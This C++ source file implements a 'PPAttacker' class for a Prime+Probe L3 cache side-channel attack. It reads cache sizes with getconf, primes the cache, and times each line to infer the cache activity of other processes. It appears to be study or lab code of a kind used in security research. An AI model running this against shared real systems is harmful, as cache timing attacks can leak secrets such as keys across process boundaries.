#include <utility>

#include <utility>

#include <utility>

//
// Created by User on 18/5/2019.
//

#include "PPAttacker.h"
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <string>
#include <unistd.h>
#include <time.h>

#include <iostream>


// ~~~~~~~ helper functions ~~~~~~~

// this function executes a console command and returns the output (stdout only)
string Exec(const char* cmd) {
    array<char, 128> buffer{};
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// searches for the first time a chunk of spaces appears, and returns the substring
// that starts right after that and goes all the way to the end.
string GetAfterSpaces(string data) {
    int i;
    for (i = 0; i < data.length(); i++)
        if (isspace(data[i]))
            break;
    for (     ; i < data.length(); i++)
        if (!isspace(data[i]))
            break;
    return data.substr(i, data.length());
}


// ~~~~~~~ PPAttacker functions ~~~~~~~

PPAttacker::PPAttacker() : Attacker("") {}

PPAttacker::PPAttacker(int intervalTime) : Attacker("") {
    interval = intervalTime;
}


void PPAttacker::Attack() {
    // declaring variables
    char buffer[L3Size];
    unsigned int measured;
    const int wordSize = 4;

    // logic
    // create a new measurements class
    measurements = Measurements();
    measurements.SetInCacheTime(inCacheTime);
    measurements.SetNoCacheTime(noCacheTime);

    // bomb L3
    for (int i = 0; i < L3Size; i += L3LineSize*wordSize) {
        buffer[i] = 0;
    }

    // wait
    usleep(interval);

    // measure L3
    for (int i = 0; i < L3Size; i += L3LineSize*wordSize) {
        measured = MeasureTime(buffer + i);
        *((int*)(buffer + i)) = measured; //instead of waistful writing to measurements, first store in the array itself
    }
    for (int i = 0; i < L3Size; i += L3LineSize*wordSize) { // now store everything in measurements
        measurements.AddMeasurement(time(NULL), *((int*)(buffer + i)));
    }
    measurements.UpdateSpeculations();
}

void PPAttacker::Configure() {
    // find out L3 size and line size by using getconf
    L3Size = stoi(GetAfterSpaces(Exec("getconf -a | grep LEVEL3_CACHE_SIZE")));
    L3LineSize = stoi(GetAfterSpaces(Exec("getconf -a | grep LEVEL3_CACHE_LINESIZE")));

    // try and find out in cache and not in cache times (without flushing)
    int i;
    char buffer[L3Size]; // to fill L3
    unsigned int cyclesSum = 0;
    int numOfIterations = 1000;

    // set up target pointer
    char tester[L3LineSize*4];
    targetPointer = tester + L3LineSize*2;

    for (i = 0; i < numOfIterations; i++) {
        for (int i = 0; i < L3Size; i += L3LineSize) {
            buffer[i] = 0;
        }
        cyclesSum += MeasureTime(targetPointer);
    }
    SetNoCacheTime(cyclesSum / numOfIterations);
    cyclesSum = 0;
    MeasureTime(targetPointer); /* makes sure target pointer has been recently read */
    for (i = 0; i < numOfIterations; i++){
        cyclesSum += MeasureTime(targetPointer);
    }
    SetInCacheTime(cyclesSum / numOfIterations);
    //cout << "in time: " << inCacheTime << endl;
    //cout << "no time: " << noCacheTime << endl;
}